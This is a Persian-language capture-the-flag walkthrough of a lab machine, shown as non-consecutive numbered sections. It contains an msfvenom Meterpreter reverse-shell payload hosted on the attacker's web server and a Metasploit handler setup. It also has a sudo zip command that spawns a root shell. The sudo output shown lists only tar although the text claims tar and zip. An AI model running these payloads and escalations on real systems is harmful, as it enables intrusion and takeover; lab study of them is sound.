## ۳. شناسایی مسیرها و فایل‌های وب

در مرحله بعد، برای پیدا کردن مسیرها و فایل‌های قابل دسترس روی وب‌سرور از ابزار **DIRB** استفاده کردم:

```bash
dirb http://192.168.43.200
```

این اسکن مسیرهای مختلفی از جمله `/css/`، `/dbadmin/`، `/img/`، `/js/` و `/vendor/` را پیدا کرد. همچنین مسیرهای `/index`، `/index.html`، `/LICENSE`، `/package`، `/server-status`، `/tools` و `/view` نیز در خروجی دیده شدند.

موردی که بیشتر از بقیه توجهم را جلب کرد مسیر **`/dbadmin/`** بود. ابزار DIRB اعلام کرد که فهرست محتویات این پوشه قابل مشاهده است (Directory Listing). به همین دلیل، این مسیر را به‌عنوان یکی از موارد مهم برای بررسی بیشتر در نظر گرفتم.

در خروجی، مسیرهای `/cgi-bin/` و `/server-status` کد HTTP 403 برگرداندند؛ درحالی‌که مسیرهای `/index`، `/index.html`، `/LICENSE`، `/package` و `/tools` با کد HTTP 200 پاسخ دادند.

## ۱۰. ساخت و میزبانی Payload متِرپرتر

![تصویر ۱۰: ساخت payload متِرپرتر و اجرای Apache](screenshots/10.png)

پس از آزمایش قبلی، با استفاده از ابزار `msfvenom` یک payload از نوع Meterpreter Reverse TCP برای لینوکس با معماری x86 ساختم. آدرس برگشت به ماشین کالی با IP برابر `192.168.43.220` و پورت `444` تنظیم شد و فایل خروجی با فرمت ELF و نام `IM_HERE` در مسیر ریشه وب‌سرور Apache ذخیره شد:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.220 lport=444 -f elf > /var/www/html/IM_HERE
```

Metasploit به‌صورت خودکار پلتفرم Linux و معماری x86 را انتخاب کرد. اندازه payload برابر ۱۲۳ بایت و اندازه نهایی فایل ELF برابر ۲۰۷ بایت گزارش شد.

سپس وجود فایل را در مسیر مشخص‌شده بررسی کردم:

```bash
ls /var/www/html/IM_HERE
```

در ادامه سرویس Apache را اجرا کردم:

```bash
systemctl start apache2.service
```

در پایان این مرحله، payload از طریق وب‌سرور ماشین کالی در دسترس بود و Apache برای ارائه آن از طریق HTTP اجرا می‌شد. دانلود و اجرای فایل روی ماشین هدف در مراحل بعدی انجام شد.



## ۱۱. آماده‌سازی دستور دانلود و اجرای Payload در PHP

به فایل `code.php` که پیش‌تر ایجاد کرده بودم برگشتم و یک دستور PHP در آن قرار دادم. هدف این دستور، دریافت payload متِرپرتر از ماشین کالی، ذخیره آن با نام `IM_HERE` در مسیر `/tmp`، دادن مجوز اجرا و سپس اجرای فایل است.

## ۱۲. راه‌اندازی Handler متِرپرتر

بعد از ساخت و میزبانی payload، در Metasploit تنظیمات لازم را انجام دادم تا منتظر اتصال برگشتی آن بماند. برای این کار از ماژول `multi/handler` استفاده کردم و تنظیمات آن را با مقادیری که هنگام ساخت فایل `IM_HERE` تعیین کرده بودم، هماهنگ کردم.

ابتدا ماژول Handler را انتخاب کردم:

```text
use exploit/multi/handler
```

این دستور ماژول عمومی Handler را بارگذاری می‌کند؛ ماژولی که برای دریافت اتصال‌های ورودی payloadها استفاده می‌شود.

سپس نوع payload را مطابق payload ساخته‌شده انتخاب کردم:

```text
set payload linux/x86/meterpreter/reverse_tcp
```

با این دستور، Handler برای دریافت اتصال برگشتی Meterpreter با معماری Linux x86 و از طریق TCP تنظیم می‌شود. نوع payload در Handler باید با نوعی که با `msfvenom` ساخته شده مطابقت داشته باشد.

در قدم بعد، آدرس IP ماشین کالی را مشخص کردم:

```text
set lhost 192.168.43.220
```

مقدار `LHOST` آدرسی است که Handler روی ماشین کالی برای دریافت اتصال ورودی استفاده می‌کند.

بعد، پورت موردنظر را تنظیم کردم:

```text
set lport 444
```

مقدار `LPORT` پورت TCPای را مشخص می‌کند که Metasploit روی آن منتظر اتصال می‌ماند. این پورت با پورتی که هنگام ساخت payload تعیین شده بود، یکسان است.

در پایان، Handler را اجرا کردم:

```text
exploit
```

Metasploit پیام زیر را نمایش داد:

```text
[*] Started reverse TCP handler on 192.168.43.220:444
```

در این مرحله Handler روی آدرس `192.168.43.220` و پورت `444` آماده دریافت اتصال برگشتی از ماشین هدف بود.

## ۱۷. بررسی مجوزهای Sudo

بعد از ورود SSH با حساب کاربری `zico`، بررسی کردم که این کاربر اجازه دارد چه دستورهایی را با `sudo` و بدون وارد کردن رمز عبور اجرا کند:

```bash
sudo -l
```

خروجی نشان داد که کاربر `zico` می‌تواند دو برنامه را با سطح دسترسی root و بدون درخواست رمز عبور اجرا کند:

```text
(root) NOPASSWD: /bin/tar

```

این نتیجه سرنخ مهمی برای افزایش سطح دسترسی بود. گزینه `NOPASSWD` یعنی اجرای دستورهای مشخص‌شده از طریق sudo به وارد کردن رمز عبور نیاز ندارد. در این ماشین، هر دو برنامه `tar` و `zip` با دسترسی root قابل اجرا بودند.

## ۱۸. استفاده از مجوز اجرای Zip برای گرفتن دسترسی Root

از مجوز اجرای برنامه `zip` برای گرفتن Shell با سطح دسترسی root استفاده کردم. ابتدا یک فایل خالی ساختم تا به‌عنوان ورودی آرشیو استفاده شود:

```bash
touch shell.php
```

بعد دستور زیر را اجرا کردم:

```bash
sudo -u root zip shell.zip shell.php -T --unzip-command="sh -c /bin/bash"
```

این دستور با ترکیب مجوز sudo و گزینه‌های برنامه `zip` کار می‌کند:

- `sudo -u root` دستور را با هویت کاربر root اجرا می‌کند.
- `zip shell.zip shell.php` آرشیوی با نام `shell.zip` می‌سازد و فایل `shell.php` را داخل آن قرار می‌دهد.
- گزینه `-T` از zip می‌خواهد بعد از ساخت آرشیو، آن را آزمایش کند.
- گزینه `--unzip-command="sh -c /bin/bash"` دستور مورد استفاده zip برای آزمایش آرشیو را تغییر می‌دهد. به‌جای اجرای دستور معمول بررسی آرشیو، یک فرمان shell اجرا می‌شود که `/bin/bash` را راه‌اندازی می‌کند.

از آنجا که پردازش `zip` با سطح دسترسی root اجرا شده بود، Shellای که از طریق دستور آزمایش آرشیو اجرا شد نیز دسترسی root داشت. پس از اجرای دستور، اعلان ترمینال به شکل زیر تغییر کرد:

```text
root@zico:~#
```

این تغییر نشان داد که Shell با دسترسی root دریافت شده است.

## ۱۹. خواندن Root Flag

پس از دریافت دسترسی root، وارد پوشه خانگی این کاربر شدم:

```bash
cd /root
```

سپس فایل‌های موجود را بررسی کردم و محتوای `flag.txt` را خواندم:

```bash
cat flag.txt
```

محتوای فایل به این شکل بود:

```text
#
#
#
# ROOOOT!
# You did it! Congratz!
#
# Hope you enjoyed!
#
#
#
#
```

با خواندن این فایل، تکمیل ماشین تأیید شد: از حساب کاربری `zico` به دسترسی root رسیدم و Root Flag را با موفقیت خواندم.
